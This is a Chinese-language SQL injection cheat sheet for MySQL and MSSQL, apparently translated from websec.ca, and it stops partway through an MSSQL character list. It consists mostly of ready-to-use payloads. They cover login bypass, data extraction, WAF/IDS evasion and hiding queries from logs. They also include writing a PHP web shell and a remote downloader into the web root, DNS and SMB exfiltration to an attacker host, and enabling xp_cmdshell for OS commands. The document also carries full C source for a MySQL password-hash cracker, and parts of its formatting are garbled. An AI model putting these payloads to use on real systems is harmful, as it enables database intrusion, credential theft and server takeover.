# SQL注入备忘录

### 0x00 前言

[原地址websec](https://websec.ca/kb/sql_injection)

这篇文章主要是总结日常测试sql注入的方法和一些总结，主要是MySQL,MSSQL,ORACLE,sql注入的过程中对他们的利用方式以及一些小技巧。

### 0x01 MySQL

```text
< MySQL >
 -------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

#### 默认数据库

| mysql | 需要root权限 |
| :--- | :--- |
| information\_schema | 数据库版本高于5.0 |

#### 测试注入

返回False表示查询无效（MySQL发生错误/网站上的内容丢失）

返回True表示查询是有效的（内容和往常一样显示）

**字符型注入**

```text
Strings:
查询语句：SELECT * FROM Table WHERE id = '1';
```

```text
'  | False
--|--
''  |  True
"  |  False
" "  |  True
\  |  False
\\\  |  True
```

**数字型注入**

```text
查询语句:SELECT * FROM Table WHERE id = 1;
```

| AND 1 | True |
| :--- | :--- |
| AND 0 | False |
| AND true | True |
| AND False | False |
| 1-false | 存在漏洞返回1 |
| 1-true | 存在漏洞返回0 |
| 1\*56 | 存在漏洞返回56 |
| 1\*56 | 不存在漏洞返回1 |

#### 

```rust
或者在参数后面加一减一，根据查询语句fuzz。
```

```rust
登录框
```

```text

登录框处可能存在万能密码登录，或者盲注之类的，一般ctf中比较常见。

查询语句：SELECT * FROM Table WHERE username = '';
常用绕过：

' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
'='
'LIKE'
'=0--+
Example：SELECT * FROM Users WHERE username = 'Mike' AND password = '' OR '' = '';
```

**注释查询**

以下内容可用于注释掉注入时查询的其余部分：

```text
#    Hash 注释
/*    c风格的注释
-- -    SQL 注释
;%00    空字节
`    反引号

Examples:
SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';

Note:
反引号只能用于在用作别名时结束查询。
```

**测试版本**

```text
变量：
VERSION()
@@VERSION
@@GLOBAL.VERSION

Example:
SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';

Note:
如果DBMS在Windows的机器上运行，输出将包含-nt-log。
```

```text
具体代码：
/*!mysql版本号*/

Example:
sql语句： SELECT * FROM Users limit 1,{INJECTION POINT};

1 /*!50094eaea*/;    False - mysql版本等于或者高于 5.00.94
1 /*!50096eaea*/;    True - mysql版本小于 5.00.96
1 /*!50095eaea*/;    False - mysql版本等于 5.00.95
二分法嘛，心里有*数。
```

**数据库凭证**

```text
Table    -->    mysql.user
Columns    --->    user, password
Current User    -->    user(), current_user(), current_user, system_user(), session_user()
```

```text
Examples:
SELECT current_user;
SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)
```

**数据库名称**

```text
Tables    -->      information_schema.schemata, mysql.db
Columns    -->  schema_name, db
Current DB    -->   database(), schema()
```

```text
Examples:
SELECT database();
SELECT schema_name FROM information_schema.schemata;
SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)
```

**服务器主机名**

```text
@@HOSTNAME

Example:
SELECT @@hostname;
```

**服务器MAC地址**

他的全球唯一标识符是一个128位的数字，最后12位数字是从接口MAC地址形成的。

```text
UUID()

Output:
aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee;

tips:
某些操作系统可能会返回一个48位随机字符串，而不是MAC地址。
```

**表名和列名**

**确定列数**

**Order by/Group by**

```text
GROUP/ORDER BY n+1;

Notes:
继续增加数字，直到得到一个False响应。
尽管GROUP BY和ORDER BY在SQL中具有不同的功能，但它们都可以以完全相同的方式用于确定查询中的列数。

Example:
sql语句： SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';

1' ORDER BY 1--+    True
1' ORDER BY 2--+    True
1' ORDER BY 3--+    True
1' ORDER BY 4--+    False - Query is only using 3 columns
-1' UNION SELECT 1,2,3--+    True
```

**基于错误\(1\)**

```text
GROUP/ORDER BY 1,2,3,4,5...

Note:

类似于以前的方法，如果启用报错显示，我们可以检查具有1个请求的列数。

Examples:
sql语句： SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}'

1' GROUP BY 1,2,3,4,5--+    Unknown column '4' in 'group statement'
1' ORDER BY 1,2,3,4,5--+    Unknown column '4' in 'order clause'
```

**基于错误\(2\)**

```text
SELECT ... INTO var_list, var_list1, var_list2...

Notes:
如果启用错误显示，此方法有效。
当注入点位于LIMIT子句之后时，查找列数很有用。

Example:
sql语句： SELECT permission FROM Users WHERE id = {INJECTION POINT};

-1 UNION SELECT 1 INTO @,@,@    使用的SELECT语句具有不同数量的列
-1 UNION SELECT 1 INTO @,@    使用的SELECT语句具有不同数量的列
-1 UNION SELECT 1 INTO @    没有错误意味着查询使用1列

Example 2:
sql语句： SELECT username, permission FROM Users limit 1,{INJECTION POINT};

1 INTO @,@,@    使用的SELECT语句具有不同数量的列
1 INTO @,@    没有错误意味着查询使用1列
```

**基于错误\(3\)**

```text
AND (SELECT * FROM SOME_EXISTING_TABLE) = 1

Notes:
如果您知道您所使用的表名称，并且启用了错误显示，则此功能可用。
它将返回表中的列的数量，而不是查询。

Example:
sql语句：SELECT permission FROM Users WHERE id = {INJECTION POINT};

1 AND (SELECT * FROM Users) = 1    操作数应该包含3列
```

**检索表名**

**union**

```text
UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE version=10;
```

**Blind**

```text
AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
```

**Error**

```text
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))
(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);
AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5

tips：

version=10 for MySQL 5
```

**检索列名**

**union**

```text
UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = 'tablename'
```

**Blind**

```text
AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
```

**Error**

```text
AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))
(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);
AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5
AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1
AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)
AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)
```

**PROCEDURE ANALYSE**

```text
PROCEDURE ANALYSE()
Web应用程序需要在要注入的SQL查询中显示所选列之一。

Example:
sql语句： SELECT username, permission FROM Users WHERE id = 1;

1 PROCEDURE ANALYSE()    得到第一个列名
1 LIMIT 1,1 PROCEDURE ANALYSE()    得到第二个列名
1 LIMIT 2,1 PROCEDURE ANALYSE()    得到第三个列名
```

**一次检索多个表/列**

```text
SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x
```

example:

![wing](http://hackerwing.com/6e435e65fd938041d58dba041e801097.png) ![wing](http://hackerwing.com/bf20b21fc0a285a13cbb7956ff97cf55.png) 我数据库里面所有列都跑出来了，这招很有用。

```text
SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
```

名

**从列名查找表名**

```text
SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
```

**从表名中查找列名**

```text
SELECT column_name FROM information_schema.columns WHERE table_name = 'Users';
SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';
```

**找出当前的查询**

```text
SELECT info FROM information_schema.processlist

tips:
从MySQL 5.1.7开始。
```

![sql](http://hackerwing.com/c02614c2c3c9594ea2856c0d4a7ba63b.png)

**引号绕过**

```text
SELECT * FROM Users WHERE username = 0x61646D696E  ---> Hex encoding.

SELECT * FROM Users WHERE username = CHAR(97, 100, 109, 105, 110)    --> CHAR() Function.
```

**字符串连接**

```text
SELECT 'a' 'd' 'mi' 'n';
SELECT CONCAT('a', 'd', 'm', 'i', 'n');
SELECT CONCAT_WS('', 'a', 'd', 'm', 'i', 'n');
SELECT GROUP_CONCAT('a', 'd', 'm', 'i', 'n');
```

> tips: CONCAT（）函数用于将多个字符串连接成一个字符串。 语法及使用特点： CONCAT\(str1,str2,…\)  
> 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL。可以有一个或多个参数。 CONCAT\_WS\(\) 代表 CONCAT With Separator ，是CONCAT\(\)的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。但是CONCAT\_WS\(\)不会忽略任何空字符串。 \(然而会忽略所有的 NULL）。 GROUP\_CONCAT函数返回一个字符串结果，该结果由分组中的值连接组合而成。

**条件声明**

* CASE
* IF\(\)
* IFNULL\(\)
* NULLIF\(\)

```text
SELECT IF(1=1, true, false);
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

**timing**

```text
SLEEP()    MySQL 5
BENCHMARK()    MySQL 4/5



Example:
' - (IF(MID(version(),1,1) LIKE 5, BENCHMARK(100000,SHA1('true')), false)) - '
```

**特权**

**文件特权** 以下查询可以帮助确定给定用户的FILE权限。

```text
SELECT file_priv FROM mysql.user WHERE user = 'username'; --。需要root权限 mysql4/5
```

![sql](http://hackerwing.com/2fca7d4d3e58d653f765172e75465ac5.png)

```text
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%'; --> 不需要特权 mysql5
```

![hacker](http://hackerwing.com/810ef0fb02cb64a2c3041a711be29ba3.png)

**读文件**

如果用户具有FILE权限，则可以读取文件。

```text
LOAD_FILE()

Examples:
SELECT LOAD_FILE('F:/wing.txt');
SELECT LOAD_FILE(0x463A2F77696E672E747874);
```

![wing](http://hackerwing.com/8f1e14d0943b84dd1968aa1ce82964db.png) ![memeda](http://hackerwing.com/fd67a46aaa2ce35db2a8f57c95c93858.png) tips:

* 文件必须位于服务器主机上。
* LOAD\_FILE（）的基本目录是@@datadir。
* 该文件必须是MySQL用户可读的。
* 文件大小必须小于max\_allowed\_packet。
* @@max\_allowed\_packet的默认大小是1047552字节。

  **写文件**

  如果用户具有FILE权限，则可以写入文件。

  \`\`\`

  INTO OUTFILE/DUMPFILE

Examples:

写入一个 PHP shell: SELECT '&lt;? system\($\_GET\[\'c\'\]\); ?&gt;' INTO OUTFILE '/var/www/shell.php'; 使用方法: [http://localhost/shell.php?c=cat /etc/passwd](http://localhost/shell.php?c=cat%20/etc/passwd)

写入一个下载器: SELECT '&lt;? fwrite\(fopen\($\_GET\[f\], \'w\'\), file\_get\_contents\($\_GET\[u\]\)\); ?&gt;' INTO OUTFILE '/var/www/get.php' 使用方法: [http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt](http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt)

```text
tips:
- 文件不能用`INTO OUTFILE`覆盖。
- `INTO OUTFILE`必须是查询中的最后一个语句。
- 没有办法对路径名进行编码，所以引号是必需的。
#### 外通道
```

DNS Requests: SELECT LOAD\_FILE\(CONCAT\('\\foo.',\(select MID\(version\(\),1,1\)\),'.ceye.io\'\)\);

```text
关于DNSLOG的使用请移步我的另外一篇文章：[DNSLOG在渗透测试中的使用技巧](http://evilwing.me/2017/12/11/DNSLOG%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/)
```

SMB Requests： ' OR 1=1 INTO OUTFILE '\\attacker\SMBshare\output.txt

```text
#### 堆查询
根据PHP应用程序使用哪个驱动程序与数据库进行通信，MySQL可以进行堆栈查询。

PDO_MYSQL驱动程序支持堆栈查询。 MySQLi(改进的扩展)驱动程序还通过multi_query()函数支持堆栈查询。
```

Examples: SELECT  _FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users\(username, password, priv\) VALUES \('BobbyTables', 'kl20da$$','admin'\); SELECT_  FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;

```text
#### 特定于MySQL的代码
MySQL允许你指定感叹号后面的版本号。 注释中的语法仅在版本大于或等于指定的版本号时执行。
```

Examples: UNION SELECT /_!50000 5,null;%00_//_!40000 4,null-- ,_//_!30000 3,null-- x_/0,null--+ SELECT 1/_!41320UNION/_!/_!/_!00000SELECT/_!/_!USER/_!\(/_!/_!/_!\*/\);

第一个例子返回版本; 它使用了一个2列的联合。 第二个例子演示了如何绕过WAF/IDS。

```text
### 模糊和混淆
#### 允许中介字符
以下字符可以用作空格。
```

09 水平标签 0A 新的一行 0B 垂直标签 0C 新页面 0D 回车 A0 不间断的空格 20 空格

```text

```

Example: '%0A%09UNION%0CSELECT%A0NULL%20%23

```text
圆括号也可以用来避免使用空格。
`()`
```

28 \( 29 \)

Example: UNION\(SELECT\(column\)FROM\(table\)\)

```text
#### 在AND/OR后允许的特征
```

20 Space 2B + 2D - 7E ~ 21 ! 40 @

Example: SELECT 1 FROM dual WHERE 1=1 AND-+-+-+-+~~\(\(1\)\)

tips: dual是一个可用于测试的虚拟表。

```text
#### 和注释混淆
可以使用注释分解查询来欺骗`WAF/IDS`并避免检测。 通过使用`＃或-`后跟一个换行符，我们可以将查询拆分成不同的行。
```

Example: 1'\# AND 0-- UNION\# I am a comment! SELECT@tmp:=table\_name x FROM-- `information_schema`.tables LIMIT 1\#

```text
URL编码的注入如下所示：
```

1'%23%0AAND 0--%0AUNION%23 I am a comment!%0ASELECT@tmp:=table\_name x FROM--%0A`information_schema`.tables LIMIT 1%23

```text
某些功能也可以使用注释和空格进行混淆。
```

VERSION/_\*/%A0 \(/_comment\*/\)

```text
#### 编码
编码有时可以用于bypass WAF/IDS。
```

URL Encoding --&gt; SELECT %74able_%6eame FROM information\_schema.tables; Double URL Encoding --&gt; SELECT %2574able_%256eame FROM information_schema.tables; Unicode Encoding --&gt; SELECT %u0074able_%u6eame FROM information_schema.tables; Invalid Hex Encoding \(ASP\) --&gt; SELECT %tab%le_%na%me FROM information\_schema.tables;

```text
#### 避免关键字
如果IDS/WAF阻止了某些关键字，还有其他方法可以在不使用编码的情况下绕过它。
```

INFORMATION\_SCHEMA.TABLES

Example: 空格 information\_schema . tables 反引号 `information_schema`.`tables` 特定的代码 /_!information\_schema.tables_/ 替代名称 information\_schema.partitions information\_schema.statistics information\_schema.key\_column\_usage information\_schema.table\_constraints

tips: 他的替代名称可能取决于表中存在的主键。

```text
### 运算符
```

AND，&& --逻辑AND = --分配一个值（作为SET语句的一部分，或作为UPDATE语句中的SET子句的一部分） ： --=分配一个值 BETWEEN ... AND ... --检查一个值是否在一个范围内 BINARY --将字符串转换为二进制字符串 ＆ --按位与 〜 --反转位 \| --按位或 ^ -- 按位XOR CASE --Case操作 DIV --整数除法 / --Division operator &lt;=&gt; -- NULL-safe等于运算符 = --等号运算符

> = --大于或等于运算符 -- 大于运算符 IS NOT NULL -- NOT NULL值测试 不是根据布尔值来测试一个值 IS NULL --NULL值测试 IS --根据布尔值来测试一个值 &lt;&lt; --Left shift &lt;= -- 小于或等于 &lt; -- 小于 LIKE -- 简单的模式匹配
>
> * -- 减号
>
>   ％或MOD-- 模运算符
>
>   NOT BETWEEN ... AND ...  -- 检查一个值是否在一个范围内
>
>   ！=，&lt;&gt;  -- 不等于运算符
>
>   NO LIKE -- 简单模式匹配的否定
>
>   NOT REGEXP -- NOT  REGEXP
>
>   NOT , ! -- 否定值
>
>   \|\| -- 或
>
>   +-- 加法运算符
>
>   REGEXP 使用正则表达式的REGEXP模式匹配
>
>   > -- 右移 RLIKE -- REGEXP的同义词 SOUNDS LIKE-- 比较声音
>
> * -- 乘法运算符
> * -- 改变参数的符号
>
>   XOR -- 逻辑异或
>
>   ```text
>   ### 常量
>   ```
>
>   current\_user
>
>   null, \N
>
>   true, false
>
>   ```text
>   ### 密码散列
>   在MySQL 4.1之前，由PASSWORD()函数计算的密码散列长度为16个字节。 这样的哈希看起来像这样：
>   ```
>
>   PASSWORD\('mypass'\)    6f8c114b58f2ce9e
>
>   ```text
>
>   ```
>
>   从MySQL 4.1开始，PASSWORD\(\)函数已被修改为产生一个更长的41字节散列值：
>
>   PASSWORD\('mypass'\)    \*6C8989366EAF75BB670AD8EA7A7FC1176A95CEF4

```text
### 密码破解
今天你cmd5了吗？
`Cain＆Abel`和`John the Ripper`都能够破解`MySQL 3.x-6.x`密码。
#### MySQL <4.1密码破解
这个工具是MySQL散列密码的高速蛮力密码破解工具。 它可以在普通的PC上在几个小时内爆破一个包含任何可打印的ASCII字符的8个字符的密码。
```code code
/* This program is public domain. Share and enjoy.
*
* Example:
* $ gcc -O2 -fomit-frame-pointer MySQLfast.c -o MySQLfast
* $ MySQLfast 6294b50f67eda209
* Hash: 6294b50f67eda209
* Trying length 3
* Trying length 4
* Found pass: barf
*
* The MySQL password hash function could be strengthened considerably
* by:
* - making two passes over the password
* - using a bitwise rotate instead of a left shift
* - causing more arithmetic overflows
*/

#include <stdio.h>

typedef unsigned long u32;

/* Allowable characters in password; 33-126 is printable ascii */
#define MIN_CHAR 33
#define MAX_CHAR 126

/* Maximum length of password */
#define MAX_LEN 12

#define MASK 0x7fffffffL

int crack0(int stop, u32 targ1, u32 targ2, int *pass_ary)
{
  int i, c;
  u32 d, e, sum, step, diff, div, xor1, xor2, state1, state2;
  u32 newstate1, newstate2, newstate3;
  u32 state1_ary[MAX_LEN-2], state2_ary[MAX_LEN-2];
  u32 xor_ary[MAX_LEN-3], step_ary[MAX_LEN-3];
  i = -1;
  sum = 7;
  state1_ary[0] = 1345345333L;
  state2_ary[0] = 0x12345671L;

  while (1) {
    while (i < stop) {
      i++;
      pass_ary[i] = MIN_CHAR;
      step_ary[i] = (state1_ary[i] & 0x3f) + sum;
      xor_ary[i] = step_ary[i]*MIN_CHAR + (state1_ary[i] << 8);
      sum += MIN_CHAR;
      state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
      state2_ary[i+1] = state2_ary[i]
        + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
    }

    state1 = state1_ary[i+1];
    state2 = state2_ary[i+1];
    step = (state1 & 0x3f) + sum;
    xor1 = step*MIN_CHAR + (state1 << 8);
    xor2 = (state2 << 8) ^ state1;

    for (c = MIN_CHAR; c <= MAX_CHAR; c++, xor1 += step) {
      newstate2 = state2 + (xor1 ^ xor2);
      newstate1 = state1 ^ xor1;

      newstate3 = (targ2 - newstate2) ^ (newstate2 << 8);
      div = (newstate1 & 0x3f) + sum + c;
      diff = ((newstate3 ^ newstate1) - (newstate1 << 8)) & MASK;
      if (diff % div != 0) continue;
      d = diff / div;
      if (d < MIN_CHAR || d > MAX_CHAR) continue;

      div = (newstate3 & 0x3f) + sum + c + d;
      diff = ((targ1 ^ newstate3) - (newstate3 << 8)) & MASK;
      if (diff % div != 0) continue;
      e = diff / div;
      if (e < MIN_CHAR || e > MAX_CHAR) continue;

      pass_ary[i+1] = c;
      pass_ary[i+2] = d;
      pass_ary[i+3] = e;
      return 1;
    }

    while (i >= 0 && pass_ary[i] >= MAX_CHAR) {
      sum -= MAX_CHAR;
      i--;
    }
    if (i < 0) break;
    pass_ary[i]++;
    xor_ary[i] += step_ary[i];
    sum++;
    state1_ary[i+1] = state1_ary[i] ^ xor_ary[i];
    state2_ary[i+1] = state2_ary[i]
      + ((state2_ary[i] << 8) ^ state1_ary[i+1]);
  }

  return 0;
}

void crack(char *hash)
{
  int i, len;
  u32 targ1, targ2, targ3;
  int pass[MAX_LEN];

  if ( sscanf(hash, "%8lx%lx", &targ1, &targ2) != 2 ) {
    printf("Invalid password hash: %s\n", hash);
    return;
  }
  printf("Hash: %08lx%08lx\n", targ1, targ2);
  targ3 = targ2 - targ1;
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);
  targ3 = targ2 - ((targ3 << 8) ^ targ1);

  for (len = 3; len <= MAX_LEN; len++) {
    printf("Trying length %d\n", len);
    if ( crack0(len-4, targ1, targ3, pass) ) {
      printf("Found pass: ");
      for (i = 0; i < len; i++)
        putchar(pass[i]);
      putchar('\n');
      break;
    }
  }
  if (len > MAX_LEN)
    printf("Pass not found\n");
}

int main(int argc, char *argv[])
{
  int i;
  if (argc <= 1)
    printf("usage: %s hash\n", argv[0]);
  for (i = 1; i < argc; i++)
    crack(argv[i]);
  return 0;
}
```

### 0x02 MSSQL

#### 默认的数据库

```text
pubs    在MSSQL 2005上不可用
model    在所有版本中都可用
msdb    在所有版本中都可用
tempdb    在所有版本中都可用
northwind    在所有版本中都可用
information_schema    MSSQL 2000 或更高版本可用
```

#### 注释查询

以下内容可用于注释查询：

```text
/* -- C风格的评论
- -- SQL注释
;％00 -- 空字节


Example:
SELECT * FROM Users WHERE username = '' OR 1=1 --' AND password = '';
SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3/*';
```

#### 测试版本

`@@VERSION`

```text
Example:
True if MSSQL version is 2008.
SELECT * FROM Users WHERE id = '1' AND @@VERSION LIKE '%2008%';

tips:
输出还将包含Windows操作系统的版本。
数据库凭证
数据库..Table    master..syslogins, master..sysprocesses
Columns    name, loginame
Current User    user, system_user, suser_sname(), is_srvrolemember('sysadmin')
Database Credentials    SELECT user, password FROM master.dbo.sysxlogins




Example:
返回当前用户:
SELECT loginame FROM master..sysprocesses WHERE spid=@@SPID;

检查当前用户是否是admin:
SELECT (CASE WHEN (IS_SRVROLEMEMBER('sysadmin')=1) THEN '1' ELSE '0' END);
Database Names
Database.Table    master..sysdatabases
Column    name
Current DB    DB_NAME(i)

Examples:
SELECT DB_NAME(5);
SELECT name FROM master..sysdatabases;
```

#### 主机名

```text
@@SERVERNAME
SERVERPROPERTY()

Examples:
SELECT SERVERPROPERTY('productversion'), SERVERPROPERTY('productlevel'), SERVERPROPERTY('edition');
```

tips:

SERVERPROPERTY\(\) 只对 MSSQL 2005 或更高版本有效

#### 列名和表名

```text
猜解列名数量
ORDER BY n+1;

Example:
sql语句: SELECT username, password, permission FROM Users WHERE id = '1';

1' ORDER BY 1--    True
1' ORDER BY 2--    True
1' ORDER BY 3--    True
1' ORDER BY 4--    False - 得出只有三列
-1' UNION SELECT 1,2,3--    True

tips：
让数字一直增加会得到一个错误的请求


以下内容可用于获取当前查询中的列。

GROUP BY / HAVING

Example:
sql语句: SELECT username, password, permission FROM Users WHERE id = '1';

1' HAVING 1=1--    Column 'Users.username' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
1' GROUP BY username HAVING 1=1--    Column 'Users.password' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
1' GROUP BY username, password HAVING 1=1--    Column 'Users.permission' is invalid in the select list because it is not contained in either an aggregate function or the GROUP BY clause.
1' GROUP BY username, password, permission HAVING 1=1--    No Error

tips:

所有列都包括在内后，将不会返回任何错误。
```

#### 猜解表名

我们可以从两个不同的数据库，information\_schema.tables或master..sysobjects中检索表。 **union**

```text
UNION SELECT name FROM master..sysobjects WHERE xtype='U'
```

**Blind**

```text
AND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'
```

**Error**

```text
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables)
AND 1 = (SELECT TOP 1 table_name FROM information_schema.tables WHERE table_name NOT IN(SELECT TOP 1 table_name FROM information_schema.tables))
```

Xtype ='U'用于用户定义的表格。 您可以使用“V”查看。

#### 猜解列名

我们可以从两个不同的数据库，information\_schema.columns或masters..syscolumns中检索这些列。 **union**

```text
UNION SELECT name FROM master..syscolumns WHERE id = (SELECT id FROM master..syscolumns WHERE name = 'tablename')
```

**Blind**

```text
AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'
```

**Blind**

```text
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns)
AND 1 = (SELECT TOP 1 column_name FROM information_schema.columns WHERE column_name NOT IN(SELECT TOP 1 column_name FROM information_schema.columns))
```

**一次查询多个表或列** 以下3个查询将创建一个临时表/列，并将所有用户定义的表格插入到其中。 然后它将转储表内容并删除该表完成。

```text
创建一个临时表或列并插入数据:
AND 1=0; BEGIN DECLARE @xy varchar(8000) SET @xy=':' SELECT @xy=@xy+' '+name FROM sysobjects WHERE xtype='U' AND name>@xy SELECT @xy AS xy INTO TMP_DB END;

转储内容：
AND 1=(SELECT TOP 1 SUBSTRING(xy,1,353) FROM TMP_DB);

删除表：
AND 1=0; DROP TABLE TMP_DB;

一个更简单的方法是从MSSQL 2005及更高版本开始。 XML函数path()作为一个连接器，允许用1个查询检索所有表。:
SELECT table_name %2b ', ' FROM information_schema.tables FOR XML PATH('')

你也可以讲你的查询语句编码：
' AND 1=0; DECLARE @S VARCHAR(4000) SET @S=CAST(0x44524f50205441424c4520544d505f44423b AS VARCHAR(4000)); EXEC (@S);--
```

#### 引号绕过

```text
SELECT * FROM Users WHERE username = CHAR(97) + CHAR(100) + CHAR(109) + CHAR(105) + CHAR(110)
```

#### 字符串连接

```text
SELECT CONCAT('a','a','a'); (SQL SERVER 2012)
SELECT 'a'+'d'+'mi'+'n';
```

#### 条件声明

```text
IF
CASE


Examples:
IF 1=1 SELECT 'true' ELSE SELECT 'false';
SELECT CASE WHEN 1=1 THEN true ELSE false END;
```

#### 定时

```text
WAITFOR DELAY 'time_to_pass';
WAITFOR TIME 'time_to_execute';

Example:
IF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';
```

#### OPENROWSET攻击

```text
SELECT * FROM OPENROWSET('SQLOLEDB', '127.0.0.1';'sa';'p4ssw0rd', 'SET FMTONLY OFF execute master..xp_cmdshell "dir"');
```

#### 命令执行

包含一个名为xp\_cmdshell的扩展存储过程，可用于执行操作系统命令。

```text
EXEC master.dbo.xp_cmdshell 'cmd';
```

从MSSQL 2005及更高版本开始，xp\_cmdshell在默认情况下处于禁用状态，但可以通过以下查询来激活：

```text
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'xp_cmdshell', 1
EXEC sp_configure reconfigure
```

或者，您可以创建自己的过程来获得相同的结果：

```text
DECLARE @execmd INT
EXEC SP_OACREATE 'wscript.shell', @execmd OUTPUT
EXEC SP_OAMETHOD @execmd, 'run', null, '%systemroot%\system32\cmd.exe /c'
```

如果SQL版本高于2000，则必须运行其他查询才能执行上述命令：

```text
EXEC sp_configure 'show advanced options', 1
EXEC sp_configure reconfigure
EXEC sp_configure 'OLE Automation Procedures', 1
EXEC sp_configure reconfigure
```

Example: 检查是否加载了xp\_cmdshell，如果是，则检查它是否处于活动状态，然后继续运行“dir”命令并将结果插入到TMP\_DB中：

```text
' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME='TMP_DB') DROP TABLE TMP_DB DECLARE @a varchar(8000) IF EXISTS(SELECT * FROM dbo.sysobjects WHERE id = object_id (N'[dbo].[xp_cmdshell]') AND OBJECTPROPERTY (id, N'IsExtendedProc') = 1) BEGIN CREATE TABLE %23xp_cmdshell (name nvarchar(11), min int, max int, config_value int, run_value int) INSERT %23xp_cmdshell EXEC master..sp_configure 'xp_cmdshell' IF EXISTS (SELECT * FROM %23xp_cmdshell WHERE config_value=1)BEGIN CREATE TABLE %23Data (dir varchar(8000)) INSERT %23Data EXEC master..xp_cmdshell 'dir' SELECT @a='' SELECT @a=Replace(@a%2B'<br></font><font color="black">'%2Bdir,'<dir>','</font><font color="orange">') FROM %23Data WHERE dir>@a DROP TABLE %23Data END ELSE SELECT @a='xp_cmdshell not enabled' DROP TABLE %23xp_cmdshell END ELSE SELECT @a='xp_cmdshell not found' SELECT @a AS tbl INTO TMP_DB--
```

转储内容:

```text
' UNION SELECT tbl FROM TMP_DB--
```

删除表：

```text
' DROP TABLE TMP_DB--
```

#### SP\_PASSWORD（隐藏查询）

将sp\_password附加到查询的末尾会将其从T-SQL日志中隐藏，作为安全措施。

```text
SP_PASSWORD

Example:
' AND 1=1--sp_password


Output:
-- 'sp_password' was found in the text of this event.
-- The text has been replaced with this comment for security reasons.
```

#### 堆查询

MSSQL 支持堆查询

```text
Example:
' AND 1=0 INSERT INTO ([column1], [column2]) VALUES ('value1', 'value2');
```

#### Fuzz

以下字符可以用作空格。

```text
01    Start of Heading
02    Start of Text
03    End of Text
04    End of Transmission
05    Enquiry
06    Acknowledge
07    Bell
08    Backspace
09    Horizontal Tab
0A    New Line
0B    Vertical Tab
0C    New Page
0D    Carriage Return
0E    Shift Out
0F    Shift In
10    Data Link Escape
11    Device Control 1
12    Device Control 2
13    Device Control 3
14    Device Control 4
15    Negative Acknowledge
16    Synchronous Idle
17    End of Transmission Block
18    Cancel
19    End of Medium
1A    Substitute
1B    Escape
1C    File Separator
